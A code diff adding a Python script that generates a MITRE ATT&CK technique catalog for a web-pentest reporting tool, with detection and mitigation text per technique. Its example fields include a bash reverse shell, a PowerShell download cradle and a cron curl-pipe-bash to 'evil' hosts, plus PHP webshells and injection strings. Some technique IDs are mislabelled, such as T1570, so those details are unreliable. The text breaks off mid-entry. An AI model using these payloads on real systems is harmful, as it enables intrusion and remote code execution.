@@ -1,0 +1,541 @@
+#!/usr/bin/env python3
+"""Generate data/attack_mapping.yaml — MITRE ATT&CK curated catalog.
+
+W8-D: Curated mapping of MITRE ATT&CK Enterprise techniques relevant to
+web/network pentest. Each entry includes:
+- technique_id (T1190, T1059, etc.)
+- name (official ATT&CK name)
+- tactic (Initial Access, Execution, etc.)
+- description (one paragraph, practical pentest context)
+- detection (how defenders detect this — for report's "Detection" section)
+- mitigation (how to fix — for report's "Remediation" section)
+- related_wstg_ids (which OWASP WSTG tests cover this technique)
+- related_cwe (which CWE IDs are commonly associated)
+- example_uses (concrete pentest scenarios for this technique)
+- applicable_to_web_mvp (bool — False for network-only techniques like SMB relay)
+
+Scope:
+    Enterprise ATT&CK v15.x (Sep 2024). Curated subset covering:
+    - Initial Access (T1190, T1078, T1133, T1195, T1199)
+    - Execution (T1059 family, T1203, T1053)
+    - Persistence (T1505, T1136, T1098)
+    - Privilege Escalation (T1548, T1068, T1078)
+    - Defense Evasion (T1027, T1140, T1036)
+    - Credential Access (T1110, T1552, T1056)
+    - Discovery (T1046, T1580, T1087, T1049)
+    - Lateral Movement (T1021, T1071, T1570)
+    - Collection (T1530, T1602, T1560)
+    - Exfiltration (T1041, T1048, T1567)
+    - Impact (T1499, T1485, T1486)
+    - Reconnaissance (T1592, T1590, T1595)
+
+Output: /home/z/my-project/download/W8/data/attack_mapping.yaml
+"""
+from pathlib import Path
+import yaml
+
+# ATT&CK catalog data: list of technique dicts
+ATTACK_TECHNIQUES = [
+    # ========== Reconnaissance (6 techniques) ==========
+    {"technique_id": "T1592", "name": "Gather Victim Host Information",
+     "tactic": "Reconnaissance",
+     "description": "Adversary collects information about the target's host infrastructure: hardware, software, network configs, security tools. In web pentest context: fingerprint web server (Apache/Nginx version), detect WAF, identify framework (Rails/Django), enumerate subdomains, find admin panels.",
+     "detection": "Monitor for unusual reconnaissance traffic: multiple HEAD/OPTIONS requests from single IP, requests to /server-status, /admin, /.well-known/security.txt, requests with curl/python user-agents.",
+     "mitigation": "Restrict access to /server-status, /admin. Remove version banners (ServerTokens Prod, ServerSignature Off). Use WAF to detect fingerprinting. Implement rate limit on directory brute-force.",
+     "related_wstg_ids": ["WSTG-INFO-01", "WSTG-INFO-02", "WSTG-INFO-03", "WSTG-INFO-08", "WSTG-INFO-09", "WSTG-INFO-10"],
+     "related_cwe": ["CWE-200", "CWE-205"],
+     "example_uses": ["nmap -sV target.com to identify server version", "whatweb to detect CMS/framework", "subfinder to enumerate subdomains"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1590", "name": "Gather Victim Network Information",
+     "tactic": "Reconnaissance",
+     "description": "Adversary collects network topology: domains, IP ranges, DNS, trust relationships. In pentest context: enumerate subdomains, find internal IPs leaked in HTTP headers/JS, identify internal API endpoints.",
+     "detection": "DNS query logs for unusual AXFR attempts, high volume of subdomain enumeration (subfinder/amass), TLS cert transparency log scraping.",
+     "mitigation": "Restrict DNS zone transfers (allow only to known secondary DNS). Use DNS rate limit (RRL). Avoid exposing internal IPs in responses, JS bundles, error messages.",
+     "related_wstg_ids": ["WSTG-INFO-11", "WSTG-INFO-04", "WSTG-INFO-06", "WSTG-ERR-06"],
+     "related_cwe": ["CWE-200"],
+     "example_uses": ["amass enum -d target.com", "dig axfr @ns1.target.com target.com", "scan JS bundles for internal API URLs"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1595", "name": "Active Scanning",
+     "tactic": "Reconnaissance",
+     "description": "Adversary actively scans victim infrastructure: port scan (nmap), vulnerability scan (nuclei), directory brute-force (gobuster/ffuf). Different from passive recon — generates traffic to target.",
+     "detection": "IDS/IPS signatures for nmap/nuclei patterns. WAF rate limit on 404 responses. SIEM alert on burst of requests from single IP to non-existent paths.",
+     "mitigation": "Use WAF with rate limiting. Implement IP block after N failed requests. Use fail2ban for aggressive scanners. Don't expose dev/staging endpoints to internet.",
+     "related_wstg_ids": ["WSTG-INFO-02", "WSTG-INFO-07", "WSTG-CONF-05"],
+     "related_cwe": ["CWE-200", "CWE-799"],
+     "example_uses": ["nmap -p- target.com (full port scan)", "gobuster dir -u https://target.com -w wordlist.txt", "nuclei -u https://target.com -t cves/"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1592.004", "name": "Gather Victim Host Information: Client Configurations",
+     "tactic": "Reconnaissance",
+     "description": "Sub-technique: gather info about client-side configs — browser, extensions, security posture. In web pentest: inspect JS bundles for client config (API URLs, feature flags, debug toggles).",
+     "detection": "Server logs for repeated /static/js/*.js requests from non-browser user-agents.",
+     "mitigation": "Don't ship debug flags in production JS. Minify + obfuscate sensitive client logic. Use CSP to limit script sources.",
+     "related_wstg_ids": ["WSTG-INFO-05", "WSTG-CLNT-12"],
+     "related_cwe": ["CWE-200", "CWE-547"],
+     "example_uses": ["grep -r 'api_url' in JS bundles", "analyze webpack chunks for config"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1590.002", "name": "Gather Victim Network Information: DNS",
+     "tactic": "Reconnaissance",
+     "description": "Sub-technique: DNS reconnaissance. Enumerate subdomains via zone transfer, brute-force, or passive sources (Certificate Transparency logs, Shodan). Used to find forgotten subdomains (often vulnerable).",
+     "detection": "DNS query logs for high-volume AXFR or TXT queries from single IP. Monitor Certificate Transparency logs (crt.sh) for adversarial activity.",
+     "mitigation": "Block AXFR from non-authorized IPs. Use CDN-managed DNS to hide origin. Implement DNSSEC.",
+     "related_wstg_ids": ["WSTG-INFO-04", "WSTG-CONF-10"],
+     "related_cwe": ["CWE-200", "CWE-350"],
+     "example_uses": ["dig axfr @ns.target.com", "subfinder -d target.com -all", "curl https://crt.sh/?q=target.com"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1580", "name": "Cloud Infrastructure Discovery",
+     "tactic": "Reconnaissance",
+     "description": "Adversary enumerates cloud resources: S3 buckets, GCS buckets, Azure blobs, IAM roles, EC2 instances. In web pentest: look for publicly-readable cloud storage containing sensitive data (backups, .env, db dumps).",
+     "detection": "Cloud trail logs for ListBuckets, GetObject calls from unknown IPs. AWS GuardDuty alerts for anomalous S3 access.",
+     "mitigation": "Block public access on all S3 buckets by default. Use IAM policies with least privilege. Enable S3 Block Public Access at account level.",
+     "related_wstg_ids": ["WSTG-CONF-11", "WSTG-INFO-11"],
+     "related_cwe": ["CWE-732", "CWE-200"],
+     "example_uses": ["aws s3 ls s3://target-backups --no-sign-request", "scan for bucket names: target, target-backup, target-prod"],
+     "applicable_to_web_mvp": True},
+
+    # ========== Initial Access (5 techniques) ==========
+    {"technique_id": "T1190", "name": "Exploit Public-Facing Application",
+     "tactic": "Initial Access",
+     "description": "Adversary exploits vulnerability in internet-facing app to gain initial foothold. Most common web pentest entry point: SQLi, RCE, SSTI, deserialization, file upload leading to webshell. Maps to OWASP Top 10 A01:2021.",
+     "detection": "WAF signatures for known exploit patterns (sqlmap, metasploit). Anomalous HTTP request sizes. Error messages revealing query syntax.",
+     "mitigation": "Input validation + output encoding. Parameterized SQL queries. Use prepared statements. Patch promptly (CVE monitoring). WAF + IPS for defense-in-depth.",
+     "related_wstg_ids": ["WSTG-INPV-01", "WSTG-INPV-02", "WSTG-INPV-05", "WSTG-INPV-13", "WSTG-INPV-19", "WSTG-INPV-20", "WSTG-ATHZ-01"],
+     "related_cwe": ["CWE-89", "CWE-78", "CWE-94", "CWE-918", "CWE-22", "CWE-79"],
+     "example_uses": ["sqlmap -u 'https://target.com/login' --data 'user=admin&pass=1' --batch", "PHP RCE via file upload: upload shell.php → /uploads/shell.php", "SSTI: inject {{7*7}} in template field → 49"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1078", "name": "Valid Accounts",
+     "tactic": "Initial Access, Persistence, Privilege Escalation, Defense Evasion",
+     "description": "Adversary uses legitimate credentials to access the system. Sources: leaked passwords (HaveIBeenPwned), default credentials (admin/admin), credential reuse across services, brute-force, phishing.",
+     "detection": "Impossible travel detection (login from geo-impossible location). Unusual login times. Multiple failed logins followed by success.",
+     "mitigation": "Enforce MFA. Strong password policy. Lockout after N failed attempts. Unique password per service (no reuse). Monitor HaveIBeenPwned for leaked creds.",
+     "related_wstg_ids": ["WSTG-ATHN-02", "WSTG-ATHN-03", "WSTG-ATHN-07", "WSTG-IDM-04", "WSTG-ATHZ-02"],
+     "related_cwe": ["CWE-521", "CWE-307", "CWE-798", "CWE-287"],
+     "example_uses": ["Hydra -L users.txt -P passwords.txt target.com http-post-form", "default creds admin/admin → access to admin panel"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1133", "name": "External Remote Services",
+     "tactic": "Initial Access, Persistence",
+     "description": "Adversary uses external-facing services (VPN, RDP, SSH, OWA) for initial access. Common in enterprise pentest. Web app MVP focus: exposed admin interfaces reachable from internet.",
+     "detection": "VPN/RDP logs for unusual geographic origins. MFA bypass attempts. Failed login spikes.",
+     "mitigation": "Require MFA for all external access. Restrict admin interfaces to internal IPs only. Use bastion host + SSH key auth.",
+     "related_wstg_ids": ["WSTG-CONF-05", "WSTG-ATHN-10"],
+     "related_cwe": ["CWE-287", "CWE-749"],
+     "example_uses": ["scan for exposed RDP/SSH (port 3389/22)", "brute-force VPN credentials"],
+     "applicable_to_web_mvp": False},
+
+    {"technique_id": "T1195", "name": "Supply Chain Compromise",
+     "tactic": "Initial Access",
+     "description": "Adversary compromises third-party software/components used by victim. Web pentest context: compromised CDN script, malicious npm/pip package, vulnerable third-party API.",
+     "detection": "SRI hash mismatch on third-party scripts. Package checksum verification failures.",
+     "mitigation": "Add SRI (Subresource Integrity) hash to all third-party scripts. Pin package versions. Audit dependencies with `npm audit` / `pip-audit`.",
+     "related_wstg_ids": ["WSTG-CRYP-05"],
+     "related_cwe": ["CWE-829", "CWE-353"],
+     "example_uses": ["CDN-hosted jQuery compromised → injects miner into all sites using it", "malicious npm package typosquats popular library"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1199", "name": "Trusted Relationship",
+     "tactic": "Initial Access",
+     "description": "Adversary abuses trusted third-party relationship (vendor, MSP, contractor) to access victim's systems. Web app context: SSO provider compromise, payment gateway manipulation, or compromised OAuth client.",
+     "detection": "Audit logs for unexpected access from trusted IPs outside normal patterns.",
+     "mitigation": "Verify third-party access scope. Use scoped OAuth tokens. Monitor SSO login anomalies.",
+     "related_wstg_ids": ["WSTG-ATHN-04"],
+     "related_cwe": ["CWE-287", "CWE-285"],
+     "example_uses": ["compromised SSO provider → access all apps using it", "OAuth token theft via redirect_uri manipulation"],
+     "applicable_to_web_mvp": True},
+
+    # ========== Execution (5 techniques) ==========
+    {"technique_id": "T1059", "name": "Command and Scripting Interpreter",
+     "tactic": "Execution",
+     "description": "Adversary executes commands via scripting language: bash, PowerShell, Python, PHP. In web pentest: RCE via cmd injection, file upload webshell, or SSTI escape.",
+     "detection": "Process monitoring for shell spawns from web server context (e.g. www-data spawning /bin/sh). EDR alerts for PowerShell -EncodedCommand.",
+     "mitigation": "Avoid shell=True in subprocess calls (use list args). Input validation on all command params. Sandbox web server (AppArmor, seccomp). Disable dangerous PHP functions (system, exec, eval).",
+     "related_wstg_ids": ["WSTG-INPV-13", "WSTG-INPV-12", "WSTG-INPV-19", "WSTG-BUSL-08", "WSTG-BUSL-09"],
+     "related_cwe": ["CWE-78", "CWE-94", "CWE-95"],
+     "example_uses": ["cmd injection: ; cat /etc/passwd #", "PHP webshell: <?php system($_GET['c']); ?>", "SSTI in Jinja2: {{ ''.__class__.__mro__[1].__subclasses__() }}"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1059.004", "name": "Command and Scripting Interpreter: Unix Shell",
+     "tactic": "Execution",
+     "description": "Sub-technique: Unix shell command execution. Most common in web pentest — bash/sh via cmd injection or webshell.",
+     "detection": "auditd logs for /bin/sh spawned by www-data. /var/log/auth.log for sudo attempts.",
+     "mitigation": "Run web server as low-priv user (www-data, nginx). Use SELinux/AppArmor to restrict shell access. Disable shell_escape in PHP config.",
+     "related_wstg_ids": ["WSTG-INPV-13"],
+     "related_cwe": ["CWE-78"],
+     "example_uses": ["cmd injection via ; separator", "bash reverse shell: bash -i >& /dev/tcp/attacker/4444 0>&1"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1059.001", "name": "Command and Scripting Interpreter: PowerShell",
+     "tactic": "Execution",
+     "description": "Sub-technique: PowerShell command execution. Common on Windows targets (IIS server with ASP.NET). Attackers use PowerShell for post-exploitation (download cradle, AMSI bypass).",
+     "detection": "PowerShell Script Block Logging (Event ID 4104). AMSI logs. Constrained Language Mode violations.",
+     "mitigation": "Enable Constrained Language Mode. Disable PowerShell v2. Use AppLocker to whitelist scripts. Log all PowerShell invocations.",
+     "related_wstg_ids": ["WSTG-INPV-13"],
+     "related_cwe": ["CWE-78"],
+     "example_uses": ["PS download cradle: IEX(New-Object Net.WebClient).DownloadString('http://evil/a.ps1')", "AMSIBypass: amsiInitFailed = true"],
+     "applicable_to_web_mvp": False},
+
+    {"technique_id": "T1059.010", "name": "Command and Scripting Interpreter: Python",
+     "tactic": "Execution",
+     "description": "Sub-technique: Python code execution. Common via SSTI (Jinja2/Mako), eval(), or flask debug RCE. Also via misconfigured Jupyter notebook exposed to internet.",
+     "detection": "auditd logs for /usr/bin/python spawned by web server user. EDR for python -c 'import os; os.system(...)'",
+     "mitigation": "Never use eval() or exec() on user input. Use ast.literal_eval for parsing literals. Restrict Jinja2 sandbox (SandboxedEnvironment). Disable Flask debug mode in production.",
+     "related_wstg_ids": ["WSTG-INPV-12", "WSTG-INPV-19"],
+     "related_cwe": ["CWE-94", "CWE-95", "CWE-1336"],
+     "example_uses": ["Flask debug RCE: /console → PIN bypass", "Jinja2 SSTI: {{ config['SECRET_KEY'] }}"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1053", "name": "Scheduled Task/Job",
+     "tactic": "Execution, Persistence, Privilege Escalation",
+     "description": "Adversary schedules task (cron, systemd timer, Windows Task Scheduler) to run payload. Web pentest: persistent webshell via cron job that re-creates itself if deleted.",
+     "detection": "Monitor /etc/cron.* for new entries. systemd timer logs. Compare with golden baseline.",
+     "mitigation": "Restrict write access to /etc/cron.*. Use systemd timers with strict unit file perms. Audit cron jobs regularly.",
+     "related_wstg_ids": [],
+     "related_cwe": ["CWE-78"],
+     "example_uses": ["crontab -l: */5 * * * * curl http://evil/sh | bash", "Persistence: cron re-creates webshell if deleted"],
+     "applicable_to_web_mvp": False},
+
+    # ========== Persistence (3 techniques) ==========
+    {"technique_id": "T1505", "name": "Server Software Component",
+     "tactic": "Persistence",
+     "description": "Adversary installs malicious component on web server: webshell, IIS module, Apache module, Nginx module. Most common persistence for web app compromise.",
+     "detection": "File integrity monitoring on web root. Diff scans for new .php/.jsp/.aspx files. WAF signature for webshell patterns (eval, system, base64_decode).",
+     "mitigation": "Web root should be read-only for web server user. Use file integrity monitoring (AIDE, OSSEC). Disable PHP if not needed.",
+     "related_wstg_ids": ["WSTG-BUSL-08", "WSTG-BUSL-09", "WSTG-INPV-13"],
+     "related_cwe": ["CWE-434", "CWE-94"],
+     "example_uses": ["upload webshell.php to /uploads/", "mod_php backdoor in Apache module"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1505.003", "name": "Server Software Component: Web Shell",
+     "tactic": "Persistence",
+     "description": "Sub-technique: deploy webshell (PHP/JSP/ASPX file) on web server. Provides persistent RCE via HTTP. Often the goal of file upload vuln exploitation.",
+     "detection": "File integrity monitoring on /var/www. Scan uploads dir for .php files. WAF signature for webshell commands (eval, system, exec, shell_exec).",
+     "mitigation": "Restrict file uploads — validate MIME, extension, content. Store uploads OUTSIDE web root. Disable script execution in uploads dir (Apache: php_flag engine off).",
+     "related_wstg_ids": ["WSTG-BUSL-08", "WSTG-BUSL-09"],
+     "related_cwe": ["CWE-434", "CWE-94"],
+     "example_uses": ["PHP webshell: <?php system($_GET['c']); ?>", "China Chopper: <%eval(Request.Item(\"#\"),\"unsafe\");%>"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1136", "name": "Create Account",
+     "tactic": "Persistence",
+     "description": "Adversary creates new account for persistent access. Web pentest: register attacker-controlled account, then escalate privileges to admin via mass assignment or IDOR.",
+     "detection": "Audit logs for unexpected user creation. SIEM alert on new admin accounts. Email notification on new account creation.",
+     "mitigation": "Admin account creation requires existing admin approval. Notify on new admin role assignment. Use least-privilege default role for self-registration.",
+     "related_wstg_ids": ["WSTG-IDM-02", "WSTG-IDM-03", "WSTG-ATHZ-03", "WSTG-ATHZ-05"],
+     "related_cwe": ["CWE-269", "CWE-285"],
+     "example_uses": ["register user, then exploit mass assignment: POST /api/users {\"is_admin\": true}", "create account with predictable username 'admin2' to confuse admin"],
+     "applicable_to_web_mvp": True},
+
+    # ========== Privilege Escalation (3 techniques) ==========
+    {"technique_id": "T1548", "name": "Abuse Elevation Control Mechanism",
+     "tactic": "Privilege Escalation, Defense Evasion",
+     "description": "Adversary abuses elevation mechanism: SUID binary, sudo misconfig, Windows UAC bypass, or web app's own role escalation (mass assignment: is_admin=true).",
+     "detection": "sudo log for unexpected invocations. Audit SUID binary list (find / -perm -4000). SIEM alert on UAC bypass patterns.",
+     "mitigation": "Restrict sudo to specific commands. Use SUID only on essential binaries. Implement server-side role validation (don't trust client).",
+     "related_wstg_ids": ["WSTG-ATHZ-03", "WSTG-ATHZ-05"],
+     "related_cwe": ["CWE-269", "CWE-915", "CWE-1321"],
+     "example_uses": ["mass assignment: PATCH /api/users/me {\"is_admin\": true}", "sudo -l → user can sudo any command"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1068", "name": "Exploitation for Privilege Escalation",
+     "tactic": "Privilege Escalation",
+     "description": "Adversary exploits kernel or service vuln to escalate privileges. Web pentest context: exploit nginx/apache RCE to escape www-data, then escalate to root via dirty COW / sudo CVE / SUID.",
+     "detection": "EDR for known CVE exploits. Kernel log for oops/panic. Audit log for su root attempts.",
+     "mitigation": "Patch kernel promptly. Use hardened kernel (grsecurity). Restrict su to admin group. Use capabilities instead of SUID where possible.",
+     "related_wstg_ids": [],
+     "related_cwe": ["CWE-269", "CWE-787"],
+     "example_uses": ["dirty COW (CVE-2016-5195) to write to /etc/passwd", "Sudo CVE-2021-3156 Baron Samedit"],
+     "applicable_to_web_mvp": False},
+
+    # ========== Defense Evasion (3 techniques) ==========
+    {"technique_id": "T1027", "name": "Obfuscated Files or Information",
+     "tactic": "Defense Evasion",
+     "description": "Adversary obfuscates payload to evade detection: base64 encoding, XOR encryption, packed binary, polymorphic code. Web pentest: obfuscated webshell (eval(gzinflate(base64_decode(...)))) or encoded SQLi payload to bypass WAF.",
+     "detection": "WAF rule for multiple encoding chains (base64 within URL encode within hex). YARA rule for known packer signatures.",
+     "mitigation": "Normalize input before security checks (decode base64, URL, hex). WAF with multiple decode passes. EDR with behavioral analysis.",
+     "related_wstg_ids": ["WSTG-INPV-05", "WSTG-INPV-13"],
+     "related_cwe": ["CWE-89", "CWE-78"],
+     "example_uses": ["SQLi: UNION SELECT CHAR(0x73,0x71,0x6c) to bypass WAF string match", "webshell: <?php eval(gzinflate(base64_decode('...'))); ?>"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1140", "name": "Deobfuscate/Decode Files or Information",
+     "tactic": "Defense Evasion",
+     "description": "Adversary decodes payload at runtime: base64_decode, gzinflate, rot13. Often paired with T1027. Web pentest: PHP webshell using eval(base64_decode($_POST['cmd'])).",
+     "detection": "EDR for processes decoding base64 then executing. PHP logs for eval+base64_decode patterns.",
+     "mitigation": "Disable dangerous PHP functions (eval, base64_decode if unused). Use disable_functions in php.ini.",
+     "related_wstg_ids": ["WSTG-INPV-13"],
+     "related_cwe": ["CWE-94", "CWE-95"],
+     "example_uses": ["PHP webshell: <?php eval(base64_decode($_POST['cmd'])); ?>", "Python pickle deserialization leading to eval"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1036", "name": "Masquerading",
+     "tactic": "Defense Evasion",
+     "description": "Adversary disguises malicious code as legitimate: webshell named 'config.php', 'wp-login.php', or 'admin_helper.php'. Often placed in legitimate-looking directory (/wp-content/uploads/, /static/).",
+     "detection": "File integrity monitoring. Diff scan against golden baseline. YARA scan of web root for webshell patterns.",
+     "mitigation": "Read-only web root. File integrity monitoring (AIDE). Restrict uploads to non-executable directory.",
+     "related_wstg_ids": ["WSTG-BUSL-08", "WSTG-BUSL-09"],
+     "related_cwe": ["CWE-434", "CWE-94"],
+     "example_uses": ["webshell named 'wp-config-sample.php' to blend with WordPress files", "malicious script named 'jquery.min.js'"],
+     "applicable_to_web_mvp": True},
+
+    # ========== Credential Access (3 techniques) ==========
+    {"technique_id": "T1110", "name": "Brute Force",
+     "tactic": "Credential Access",
+     "description": "Adversary attempts to guess credentials via brute force or dictionary attack. Web pentest: HTTP basic auth, login form, API token endpoint. Defense: rate limit + CAPTCHA + account lockout.",
+     "detection": "Multiple failed logins from same IP. Distributed attack: multiple IPs attacking one account. SIEM alert on velocity thresholds.",
+     "mitigation": "Account lockout after N failed attempts. CAPTCHA after K attempts. Rate limit per IP. Use bcrypt/scrypt/argon2 (slow hash) to slow down brute force.",
+     "related_wstg_ids": ["WSTG-ATHN-03", "WSTG-IDM-04", "WSTG-ATHN-07", "WSTG-BUSL-05"],
+     "related_cwe": ["CWE-307", "CWE-799", "CWE-521"],
+     "example_uses": ["hydra -L users.txt -P rockyou.txt target.com http-post-form", "Burp Intruder on login with payload from SecLists"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1552", "name": "Unsecured Credentials",
+     "tactic": "Credential Access",
+     "description": "Adversary finds credentials in files not properly secured. Web pentest: .env file exposed, credentials in source code (JS bundles, Git repo), AWS keys in client-side code, hardcoded DB password in PHP file.",
+     "detection": "Secret scanning (TruffleHog, GitLeaks) on codebase. Monitor for .env file access. WAF alert on /.env, /config.json, /wp-config.php requests.",
+     "mitigation": "Use vault (HashiCorp Vault, AWS Secrets Manager). Never commit .env to git. Scan CI pipeline for secrets. Use pre-commit hooks (TruffleHog).",
+     "related_wstg_ids": ["WSTG-CONF-03", "WSTG-CONF-04", "WSTG-ERR-08", "WSTG-ATHN-06"],
+     "related_cwe": ["CWE-798", "CWE-522", "CWE-200"],
+     "example_uses": ["exposed /.env with AWS_SECRET_ACCESS_KEY", "credentials hardcoded in JS bundle: const API_KEY = 'sk-...'", "Git history contains .env with DB password"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1552.001", "name": "Unsecured Credentials: Credentials In Files",
+     "tactic": "Credential Access",
+     "description": "Sub-technique: find credentials in files. Web pentest context: source code review reveals hardcoded creds, exposed backup file contains DB credentials, server log leaks Authorization header.",
+     "detection": "Secret scanning in CI/CD. File system audit for unexpected reads to /etc/shadow or app config files.",
+     "mitigation": "Use environment variables + vault. Rotate exposed credentials immediately. Audit file permissions on config files.",
+     "related_wstg_ids": ["WSTG-CONF-03", "WSTG-ERR-08"],
+     "related_cwe": ["CWE-798", "CWE-522"],
+     "example_uses": ["grep -r 'password' in /var/www finds hardcoded DB password", "exposed .git/config reveals internal repo URL with embedded creds"],
+     "applicable_to_web_mvp": True},
+
+    # ========== Discovery (4 techniques) ==========
+    {"technique_id": "T1046", "name": "Network Service Discovery",
+     "tactic": "Discovery",
+     "description": "Adversary enumerates network services: nmap, masscan. Used post-compromise to find internal services to attack laterally. Web app context: SSRF used to scan internal network from web server.",
+     "detection": "Network IDS for nmap signatures. SIEM alert on burst of SYN packets from one host.",
+     "mitigation": "Network segmentation. Block outbound traffic from web server (egress filtering). Use SSRF guard (allow-list of allowed outbound URLs).",
+     "related_wstg_ids": ["WSTG-INPV-20", "WSTG-INFO-11"],
+     "related_cwe": ["CWE-918", "CWE-200"],
+     "example_uses": ["SSRF: ?url=http://10.0.0.5:8080/admin to discover internal services", "nmap -sn 10.0.0.0/24 for internal host discovery"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1087", "name": "Account Discovery",
+     "tactic": "Discovery",
+     "description": "Adversary enumerates user accounts. Web pentest: enumerate users via API endpoint (/api/users/1, /api/users/2), different response for valid vs invalid usernames (timing or message).",
+     "detection": "API access logs for sequential ID requests. SIEM alert on enumeration patterns.",
+     "mitigation": "Use UUIDs instead of sequential IDs. Return same error for valid/invalid user. Rate limit on user-related endpoints.",
+     "related_wstg_ids": ["WSTG-IDM-04", "WSTG-ATHZ-04", "WSTG-APIT-02"],
+     "related_cwe": ["CWE-204", "CWE-639"],
+     "example_uses": ["enumerate users: GET /api/users/1, /api/users/2, ...", "login with 'admin' → 'Invalid password', 'root' → 'Invalid username' (username enumeration)"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1049", "name": "System Network Connections",
+     "tactic": "Discovery",
+     "description": "Adversary enumerates network connections: netstat, ss. Post-compromise technique to identify what services the compromised host talks to (DB, internal APIs).",
+     "detection": "EDR for `netstat`/`ss` invocation by web server user.",
+     "mitigation": "Restrict shell access for web server user. Use AppArmor to block `/bin/netstat` for www-data.",
+     "related_wstg_ids": [],
+     "related_cwe": ["CWE-200"],
+     "example_uses": ["www-data: ss -tnlp reveals 5432 (postgres) and 6379 (redis) on localhost"],
+     "applicable_to_web_mvp": False},
+
+    {"technique_id": "T1083", "name": "File and Directory Discovery",
+     "tactic": "Discovery",
+     "description": "Adversary enumerates files and directories. Web pentest: directory brute-force (gobuster, feroxbuster, ffuf), path traversal to enumerate /etc/passwd, /home, /var/www structure.",
+     "detection": "WAF rate limit on 404 responses to same IP. SIEM alert on directory brute-force patterns.",
+     "mitigation": "Disable directory listing (Options -Indexes in Apache). Use robots.txt as honeypot (disallow /admin to attract scanners). WAF rate limit on 404s.",
+     "related_wstg_ids": ["WSTG-INFO-07", "WSTG-ATHZ-01", "WSTG-ERR-05"],
+     "related_cwe": ["CWE-22", "CWE-538", "CWE-548"],
+     "example_uses": ["gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/big.txt", "LFI: ../../etc/passwd to enumerate system files"],
+     "applicable_to_web_mvp": True},
+
+    # ========== Lateral Movement (3 techniques) ==========
+    {"technique_id": "T1021", "name": "Remote Services",
+     "tactic": "Lateral Movement",
+     "description": "Adversary uses remote services (SSH, RDP, SMB, VNC) to move between hosts. Web pentest: steal credentials from web app DB, use those creds to SSH into internal host.",
+     "detection": "SIEM alert on remote login from web server IP. EDR for credential reuse.",
+     "mitigation": "Unique credentials per service. Network segmentation. Just-in-time access (temporary creds).",
+     "related_wstg_ids": [],
+     "related_cwe": ["CWE-522"],
+     "example_uses": ["stolen creds from web app DB → ssh user@internal-host"],
+     "applicable_to_web_mvp": False},
+
+    {"technique_id": "T1071", "name": "Application Layer Protocol",
+     "tactic": "Command and Control",
+     "description": "Adversary uses application layer protocol (HTTP, HTTPS, DNS, SMB) for C2 communication. Web pentest: beacon over HTTP(S), DNS tunneling, ICMP exfiltration.",
+     "detection": "Network traffic analysis for beaconing patterns (regular intervals). DNS logs for high volume of TXT queries (DNS tunneling).",
+     "mitigation": "Egress filtering (allow only whitelisted outbound IPs/domains). DNS rate limit. Deep packet inspection.",
+     "related_wstg_ids": ["WSTG-CLNT-10"],
+     "related_cwe": ["CWE-918"],
+     "example_uses": ["HTTP beacon: GET /cdn/jquery.js every 30s (regular interval reveals C2)", "DNS tunneling: encode data as subdomain of evil.com"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1570", "name": "Use Alternate Authentication Material",
+     "tactic": "Lateral Movement, Defense Evasion",
+     "description": "Adversary uses stolen auth tokens/cookies/tickets instead of credentials. Web pentest: steal session cookie via XSS, replay it to access other user's account. Pass-the-hash, Pass-the-ticket for AD.",
+     "detection": "Impossible travel for session tokens. SIEM alert on session reuse from different geo. EDR for token manipulation.",
+     "mitigation": "Short session timeout. Rotate session ID on privilege change. Use HttpOnly + Secure + SameSite cookies. Bind session to IP/fingerprint.",
+     "related_wstg_ids": ["WSTG-SESS-09", "WSTG-SESS-04", "WSTG-CLNT-12"],
+     "related_cwe": ["CWE-384", "CWE-522"],
+     "example_uses": ["stolen session cookie via XSS → replay to access victim's account", "JWT token theft from localStorage → used in API auth"],
+     "applicable_to_web_mvp": True},
+
+    # ========== Collection (3 techniques) ==========
+    {"technique_id": "T1530", "name": "Data from Cloud Storage",
+     "tactic": "Collection",
+     "description": "Adversary collects data from cloud storage: S3 bucket, GCS bucket. Web pentest: find misconfigured S3 bucket containing app backups, .env files, user data exports.",
+     "detection": "Cloud trail logs for unexpected GetObject/ListObjects calls. S3 access logs for anonymous access.",
+     "mitigation": "Block public access on buckets. Use IAM roles instead of access keys. Encrypt S3 buckets. Enable S3 Object Lock for immutability.",
+     "related_wstg_ids": ["WSTG-CONF-11"],
+     "related_cwe": ["CWE-732", "CWE-200"],
+     "example_uses": ["aws s3 sync s3://target-backups ./loot --no-sign-request", "S3 bucket contains db.sql.gz with all user data"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1602", "name": "Data from Configuration Repository",
+     "tactic": "Collection",
+     "description": "Adversary collects configuration data: network device configs, server configs, app configs. Web pentest: scrape /wp-config.php, /.env, /config.json, /admin/settings.",
+     "detection": "Access logs for known sensitive config file paths. WAF rule for /.env, /config.json, /wp-config.php.",
+     "mitigation": "Store config outside web root. Use environment variables. Deny access to config files via .htaccess / nginx config.",
+     "related_wstg_ids": ["WSTG-CONF-03", "WSTG-CONF-04", "WSTG-ERR-08"],
+     "related_cwe": ["CWE-798", "CWE-522", "CWE-552"],
+     "example_uses": ["curl https://target.com/.env → AWS keys", "curl https://target.com/wp-config.php → DB creds"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1560", "name": "Archive Collected Data",
+     "tactic": "Collection",
